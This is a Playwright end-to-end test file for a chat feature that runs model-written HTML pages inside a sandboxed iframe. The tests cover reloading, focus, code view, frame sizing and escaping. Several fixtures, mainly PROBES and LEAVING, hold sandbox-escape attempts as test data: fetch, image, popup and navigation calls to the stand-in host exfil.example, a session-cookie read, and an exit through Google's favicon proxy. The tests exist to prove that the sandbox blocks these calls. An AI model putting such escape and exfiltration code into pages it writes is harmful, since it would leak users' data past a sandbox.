/**
 * Chat — a page the model wrote, in a real browser (ADR-370).
 *
 * Hermetic: the API is mocked, and the frame runs the very prefix the backend
 * composes (`page_frame_prefix.json`, held equal to `page_frame` by
 * `apps/api/tests/unit/domains/interactive_pages/test_document.py`). Only an engine
 * can say what follows, because the sandbox, the policy and the layout are its own:
 *
 * 1. A page of the current turn runs at once, and neither the end of its turn, nor
 *    a read of the server, nor the next turn reloads it. Read back from history it
 *    waits for a click: a loop that never ends would otherwise freeze the tab each
 *    time the conversation opens.
 * 2. The click hands it the keyboard, and the code is a second view of one running
 *    page, whose Copy gives the page as written.
 * 3. Nothing leaves: no request, no parent, no WebRTC, no popup, no navigation. What
 *    the runtime gives works, and a failure is told as text.
 * 4. The frame follows its page, within the bound, from a phone to a desktop.
 * 5. The answer around it: a code block keeps every line, and a person's words stay
 *    words (the two defects that opened this work, 2026-11-04).
 */
import { readFileSync } from 'node:fs';
import path from 'node:path';

import type { Locator, Page } from '@playwright/test';

import en from '../../locales/en/translation.json';
import { scanPage } from '../a11y/scan';
import { test, expect, waitForHydration, chatRoutes, type MockRoute } from '../fixtures';
import { awaitStyledPage, expectNoOverflow } from './overflow-report';

declare global {
  interface Window {
    /** One controller per turn: `route.fulfill` could only deliver a body at once. */
    turnStreams?: ReadableStreamDefaultController<Uint8Array>[];
    /** What the last Copy wrote. */
    copied?: string;
  }
}

const NL = String.fromCharCode(10);
const { prefix: PREFIX }: { prefix: string } = JSON.parse(
  readFileSync(
    path.join(
      __dirname,
      '../../../api/tests/unit/domains/interactive_pages/page_frame_prefix.json'
    ),
    'utf8'
  )
);

const PAGE_ID = 'page_app_e2e';
const ROW_ID = '00000000-0000-4000-8000-00000000a370';
const NEXT_ROW_ID = '00000000-0000-4000-8000-00000000a371';
const CONVERSATION_ID = '00000000-0000-4000-8000-00000000c370';
const WORDS = 'Here is your counter.';
const ANSWER = `${WORDS}${NL}${NL}<div class="lia-page-app" data-registry-id="${PAGE_ID}"></div>`;
const FRAME = 'iframe.lia-page-app-widget__iframe';

const pageOf = (head: string, body: string): string =>
  `<!doctype html><html lang="en"><head><title>Counter</title>${head}</head><body>${body}</body></html>`;

const COUNTER = pageOf(
  '<style>body{margin:0;padding:16px;font:16px system-ui}</style>',
  `<button id="count" type="button">0</button>${NL}` +
    '<script>(function(){var b=document.getElementById("count"),n=0;' +
    'b.addEventListener("click",function(){n+=1;b.textContent=String(n)})})();</script>'
);

/** Tries every way out, then says what happened in the page itself. */
const PROBES = pageOf(
  '',
  '<pre id="verdict"></pre><img id="pixel" alt="" src="https://exfil.example/image.png">' +
    '<script>(async function(){var out={};' +
    'try{await fetch("https://exfil.example/fetch");out.fetch="reached"}catch(e){out.fetch="blocked"}' +
    'try{out.parent=parent.document?"reached":"none"}catch(e){out.parent="blocked"}' +
    'try{out.cookie=document.cookie.indexOf("lia_session")<0?"hidden":"read"}catch(e){out.cookie="hidden"}' +
    'out.rtc=typeof RTCPeerConnection;' +
    'try{out.popup=window.open("https://exfil.example/popup")?"reached":"blocked"}catch(e){out.popup="blocked"}' +
    'try{top.location.href="https://exfil.example/top"}catch(e){out.top="threw"}' +
    'localStorage.setItem("k","kept");out.storage=localStorage.getItem("k");' +
    'document.getElementById("verdict").textContent=JSON.stringify(out)})();</script>'
);

const LEAVING = pageOf('', '<script>location.href="https://exfil.example/navigation";</script>');
const FAILING = pageOf('', '<p>x</p><script>throw new Error("boom in the page");</script>');
const tall = (height: number): string =>
  pageOf(`<style>body{margin:0}main{height:${height}px}</style>`, '<main>Tall</main>');

function pageItem(source: string, view: 'page' | 'code' = 'page'): Record<string, unknown> {
  return {
    id: PAGE_ID,
    type: 'PAGE_APP',
    payload: {
      _registry_id: PAGE_ID,
      title: 'Counter',
      html_content: PREFIX + source,
      source_offset: PREFIX.length,
      initial_view: view,
    },
    meta: { source: 'interactive_page', timestamp: '2026-11-05T09:00:00Z' },
  };
}

function row(content: string, widgets?: Record<string, unknown>): Record<string, unknown> {
  return {
    id: ROW_ID,
    role: 'assistant',
    content,
    message_metadata: widgets ? { widgets } : {},
    created_at: '2026-11-05T09:00:00Z',
    tokens_in: null,
    tokens_out: null,
    tokens_cache: null,
    cost_eur: null,
    google_api_requests: null,
    stt_provider: null,
  };
}

function historyPage(messages: Record<string, unknown>[]): Record<string, unknown> {
  return {
    messages,
    conversation_id: CONVERSATION_ID,
    total_count: messages.length,
    has_more: false,
    next_cursor: null,
  };
}

/** A conversation holding one answer, as `GET /conversations/me/messages` serves it. */
function historyRoutes(source: string, view: 'page' | 'code' = 'page'): MockRoute[] {
  return [
    ...chatRoutes([]),
    {
      url: '**/api/v1/conversations/me/messages*',
      json: historyPage([row(ANSWER, { [PAGE_ID]: pageItem(source, view) })]),
    },
  ];
}

/** Keep each turn's stream open until the spec writes to it. */
async function holdChatStreams(page: Page): Promise<void> {
  await page.addInitScript(() => {
    const network = window.fetch.bind(window);
    window.turnStreams = [];
    window.fetch = (input, init) => {
      const url = input instanceof Request ? input.url : String(input);
      if (!url.includes('/api/v1/agents/chat/stream')) return network(input, init);
      const body = new ReadableStream<Uint8Array>({
        start: controller => {
          window.turnStreams?.push(controller);
        },
      });
      return Promise.resolve(
        new Response(body, { headers: { 'content-type': 'text/event-stream' } })
      );
    };
  });
}

/** Write chunks to the turn the page opened last. */
async function stream(page: Page, chunks: Record<string, unknown>[]): Promise<void> {
  const body = chunks.map(chunk => `data: ${JSON.stringify(chunk)}${NL}${NL}`).join('');
  await page.evaluate(text => {
    window.turnStreams?.at(-1)?.enqueue(new TextEncoder().encode(text));
  }, body);
}

async function endTurn(page: Page, archivedRow: string): Promise<void> {
  await stream(page, [
    { type: 'done', content: '', metadata: { archived_message_id: archivedRow } },
  ]);
  await page.evaluate(() => window.turnStreams?.at(-1)?.close());
}

async function ask(page: Page, words: string, turn: number): Promise<void> {
  const composer = page.locator('textarea');
  await expect(composer).toBeEnabled();
  await composer.fill(words);
  await composer.press('Enter');
  await expect.poll(() => page.evaluate(() => window.turnStreams?.length)).toBe(turn);
}

async function openChat(page: Page): Promise<void> {
  await page.goto('/en/dashboard/chat');
  await waitForHydration(page);
  await awaitStyledPage(page, 'chat page app');
}

/**
 * Wait out the chat's first positioning.
 *
 * Unavoidable sleep, as in chat-scroll-follow.spec.ts: the initial-pin window is an
 * internal timer of ChatMessageList with no observable DOM state, and a pin inside it
 * moves the page under a click faster than a person can.
 */
async function letTheChatSettle(page: Page): Promise<void> {
  await page.waitForTimeout(2000);
}

/** The widget's top, clear of the chat's sticky header. */
async function widgetTop(page: Page): Promise<number> {
  return (await page.locator('.lia-page-app-widget').boundingBox())?.y ?? 0;
}

/**
 * A pointer's first click on a page that has just started. The page runs in a process of
 * its own: until the browser routes input to it, a click falls on the frame and never
 * reaches it, though Playwright reports it done (the CI clicked 300 ms before the first
 * paint, 2026-11-06, and a frame already drawn lost 1 click in 16 on one CPU). Nothing
 * in the page says when routing starts, so the click repeats until it is heard, and
 * never once it was: the count stays exact.
 */
async function firstClick(count: Locator): Promise<void> {
  await expect(async () => {
    if ((await count.textContent()) === '0') await count.click();
    await expect(count).toHaveText('1', { timeout: 1000 });
  }).toPass({ timeout: 15_000 });
}

test.describe('an interactive page in the chat (ADR-370)', () => {
  test('runs at once in its turn, is never reloaded, and waits once read back', async ({
    page,
    authenticate,
    mockApi,
  }) => {
    const server = { archived: false };
    let loads = 0;
    page.on('framenavigated', frame => {
      if (frame.url() === 'about:srcdoc') loads += 1;
    });
    await holdChatStreams(page);
    await authenticate();
    await mockApi([
      ...chatRoutes([]),
      {
        url: '**/api/v1/conversations/me/messages*',
        handler: async route => {
          const widgets = { [PAGE_ID]: pageItem(COUNTER) };
          await route.fulfill({
            status: 200,
            contentType: 'application/json',
            body: JSON.stringify(historyPage(server.archived ? [row(ANSWER, widgets)] : [])),
          });
        },
      },
    ]);
    await openChat(page);

    await ask(page, 'Make me a counter', 1);
    await stream(page, [
      { type: 'token', content: WORDS },
      { type: 'registry_update', metadata: { items: { [PAGE_ID]: pageItem(COUNTER) }, count: 1 } },
      { type: 'content_replacement', content: ANSWER },
    ]);

    await expect(page.locator(FRAME)).toHaveAttribute('sandbox', 'allow-scripts allow-forms');
    const count = page.frameLocator(FRAME).locator('#count');
    // The list follows the stream, so a pointer would chase the button: this state only
    // has to exist. A real click is proved on a page at rest, below.
    await count.evaluate(button => (button as HTMLElement).click());
    await expect(count).toHaveText('1');

    // The end of the turn, then a read of the server that brings its archived row.
    await endTurn(page, ROW_ID);
    server.archived = true;
    const read = page.waitForResponse('**/api/v1/conversations/me/messages*');
    await page.evaluate(() => window.dispatchEvent(new Event('online')));
    await read;
    await expect(page.getByText(WORDS)).toHaveCount(1);
    await expect(count).toHaveText('1');

    // The next turn, whose answer lands under the running page.
    await ask(page, 'Thanks', 2);
    await stream(page, [{ type: 'token', content: 'You are welcome.' }]);
    await endTurn(page, NEXT_ROW_ID);
    await expect(page.getByText('You are welcome.')).toBeVisible();
    await expect(count).toHaveText('1');
    await expect(page.locator(FRAME)).toHaveCount(1);
    expect(loads).toBe(1);

    await page.reload();
    await waitForHydration(page);
    await expect(page.getByRole('button', { name: en.page_apps.start })).toBeVisible();
    await expect(page.locator(FRAME)).toHaveCount(0);
  });

  test('hands the page the keyboard once it is started, and passes the scan', async ({
    page,
    authenticate,
    mockApi,
  }) => {
    await authenticate();
    await mockApi(historyRoutes(COUNTER));
    await openChat(page);
    await letTheChatSettle(page);

    const start = page.getByRole('button', { name: en.page_apps.start });
    await expect(start).toBeVisible();
    await expect(page.locator(FRAME)).toHaveCount(0);
    const poster = await scanPage(page, test.info(), 'page poster');
    expect(poster.blocking, poster.summary).toHaveLength(0);

    await start.focus();
    await page.keyboard.press('Enter');
    await expect(page.locator(FRAME)).toBeFocused();
    // Asked for, the page shows its top, clear of the chat's sticky header.
    await expect.poll(() => widgetTop(page)).toBeGreaterThanOrEqual(90);
    await page.keyboard.press('Tab');
    await page.keyboard.press('Enter');
    await expect(page.frameLocator(FRAME).locator('#count')).toHaveText('1');

    const running = await scanPage(page, test.info(), 'running page');
    expect(running.blocking, running.summary).toHaveLength(0);
  });

  test('shows the code of a running page without stopping it', async ({
    page,
    authenticate,
    mockApi,
  }) => {
    await page.addInitScript(() => {
      Object.defineProperty(navigator, 'clipboard', {
        value: {
          writeText: async (text: string) => {
            window.copied = text;
          },
        },
      });
    });
    await authenticate();
    await mockApi(historyRoutes(COUNTER));
    await openChat(page);
    await letTheChatSettle(page);
    await page.getByRole('button', { name: en.page_apps.start }).click();
    await expect.poll(() => widgetTop(page)).toBeGreaterThanOrEqual(90);
    const count = page.frameLocator(FRAME).locator('#count');
    await firstClick(count);

    await page.getByRole('button', { name: en.page_apps.show_code }).click();
    await expect(page.locator(FRAME)).toBeHidden();
    await page.getByRole('button', { name: en.chat.code.copy }).click();
    await expect.poll(() => page.evaluate(() => window.copied)).toBe(COUNTER);

    await page.getByRole('button', { name: en.page_apps.show_page }).click();
    await expect(page.locator(FRAME)).toBeVisible();
    await expect(count).toHaveText('1');

    await page.getByRole('button', { name: en.page_apps.restart }).click();
    await expect(count).toHaveText('0');
  });

  test('opens on the code when that is what was asked, and runs nothing', async ({
    page,
    authenticate,
    mockApi,
  }) => {
    await authenticate();
    await mockApi(historyRoutes(COUNTER, 'code'));
    await openChat(page);

    await expect(page.getByRole('button', { name: en.chat.code.copy })).toBeVisible();
    await expect(page.locator(FRAME)).toHaveCount(0);
  });

  test('lets nothing out, and gives what the runtime promises', async ({
    page,
    authenticate,
    mockApi,
  }) => {
    const left: string[] = [];
    page.on('request', request => {
      if (request.url().includes('exfil.example')) left.push(request.url());
    });
    let popups = 0;
    page.context().on('page', () => {
      popups += 1;
    });
    await authenticate();
    await mockApi(historyRoutes(PROBES));
    await openChat(page);
    await page.getByRole('button', { name: en.page_apps.start }).click();

    const verdict = page.frameLocator(FRAME).locator('#verdict');
    await expect(verdict).not.toHaveText('');
    // Whether `top.location` throws is the engine's choice; that nothing moved is not.
    expect(JSON.parse((await verdict.textContent()) ?? '{}')).toMatchObject({
      fetch: 'blocked',
      parent: 'blocked',
      cookie: 'hidden',
      rtc: 'undefined',
      popup: 'blocked',
      storage: 'kept',
    });
    expect(left).toEqual([]);
    expect(popups).toBe(0);
    await expect(page).toHaveURL(/\/en\/dashboard\/chat/);
  });

  test('never navigates out, even by its own frame', async ({ page, authenticate, mockApi }) => {
    const left: string[] = [];
    page.on('request', request => {
      if (request.url().includes('exfil.example')) left.push(request.url());
    });
    await authenticate();
    await mockApi(historyRoutes(LEAVING));
    await openChat(page);
    // The refusal is the proof the attempt happened: without it this test would pass
    // on a page that never tried.
    const refused = page.waitForEvent('console', line => line.text().includes('exfil.example'));
    await page.getByRole('button', { name: en.page_apps.start }).click();

    await refused;
    expect(left).toEqual([]);
  });

  test('does not get out through another path of a host the application frames', async ({
    page,
    authenticate,
    mockApi,
  }) => {
    // Google fetches the domain this URL names: a whole allowed host is a way out.
    const url = 'https://www.google.com/s2/favicons?domain=exfil.example';
    const reached: string[] = [];
    page.on('request', request => {
      if (request.url().startsWith('https://www.google.com/')) reached.push(request.url());
    });
    await authenticate();
    await mockApi(
      historyRoutes(pageOf('', `<script>location.href=${JSON.stringify(url)};</script>`))
    );
    await openChat(page);
    // Before the click: the refusal is the proof of the attempt, and it comes at once.
    const refused = page.waitForEvent('console', line => line.text().includes('google.com'));
    await page.getByRole('button', { name: en.page_apps.start }).click();

    await refused;
    expect(reached).toEqual([]);
  });

  test('tells a failure of the page as text', async ({
    page,
    browserName,
    authenticate,
    mockApi,
  }) => {
    await authenticate();
    await mockApi(historyRoutes(FAILING));
    await openChat(page);
    await page.getByRole('button', { name: en.page_apps.start }).click();

    const notice = page.locator('.lia-page-app-widget__notice');
    await expect(notice).toContainText(en.page_apps.failed);
    // WebKit withholds what a sandboxed script threw: « Script error. ».
    if (browserName !== 'webkit') await expect(notice).toContainText('boom in the page');
  });

  for (const sample of [
    { width: 1280, height: 900 },
    { width: 390, height: 800 },
  ]) {
    test(`follows its page within the bound at ${sample.width}px`, async ({
      page,
      authenticate,
      mockApi,
    }) => {
      await page.setViewportSize(sample);
      await authenticate();
      await mockApi(historyRoutes(tall(4000)));
      await openChat(page);
      await page.getByRole('button', { name: en.page_apps.start }).click();

      const bound = Math.floor(sample.height * 0.8);
      const frame = page.locator(FRAME);
      await expect
        .poll(async () => Math.round((await frame.boundingBox())?.height ?? 0))
        .toBe(bound);
      const box = await frame.boundingBox();
      expect((box?.x ?? -1) >= 0).toBe(true);
      expect((box?.x ?? 0) + (box?.width ?? Infinity)).toBeLessThanOrEqual(sample.width);
      await expectNoOverflow(page, `page frame at ${sample.width}px`);
    });
  }

  test('grows to a page taller than its first box', async ({ page, authenticate, mockApi }) => {
    await page.setViewportSize({ width: 390, height: 800 });
    await authenticate();
    await mockApi(historyRoutes(tall(520)));
    await openChat(page);
    await page.getByRole('button', { name: en.page_apps.start }).click();

    const frame = page.locator(FRAME);
    await expect.poll(async () => Math.round((await frame.boundingBox())?.height ?? 0)).toBe(520);
    await expect(page.frameLocator(FRAME).locator('main')).toBeVisible();
  });
});

test.describe('the answer around it (2026-11-04)', () => {
  const CODE = [
    '<!doctype html>',
    '<html>',
    '<body>',
    '',
    '  <script>',
    '    const cells = [];',
    '',
    '    function play() {}',
    '  </script>',
    '</body>',
    '</html>',
  ].join(NL);
  const escaped = CODE.replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;');
  const HTML_ANSWER =
    `<div class="lia-response">${NL}<p>Here is the code.</p>${NL}` +
    `<pre><code class="language-html">${escaped}${NL}</code></pre>${NL}</div>`;

  test('a code block keeps every line, and Copy gives the file whole', async ({
    page,
    authenticate,
    mockApi,
  }) => {
    await page.addInitScript(() => {
      Object.defineProperty(navigator, 'clipboard', {
        value: {
          writeText: async (text: string) => {
            window.copied = text;
          },
        },
      });
    });
    await authenticate();
    await mockApi([
      ...chatRoutes([]),
      { url: '**/api/v1/conversations/me/messages*', json: historyPage([row(HTML_ANSWER)]) },
    ]);
    await openChat(page);

    await page.getByRole('button', { name: en.chat.code.copy }).click();
    await expect.poll(() => page.evaluate(() => window.copied)).toBe(CODE);
  });

  test('the words a person typed stay on screen, tags included', async ({
    page,
    authenticate,
    mockApi,
  }) => {
    await holdChatStreams(page);
    await authenticate();
    await mockApi(chatRoutes([]));
    await openChat(page);

    await ask(page, 'not </script>, </body> and </html>', 1);

    await expect(page.getByText('not </script>, </body> and </html>')).toBeVisible();
  });
});
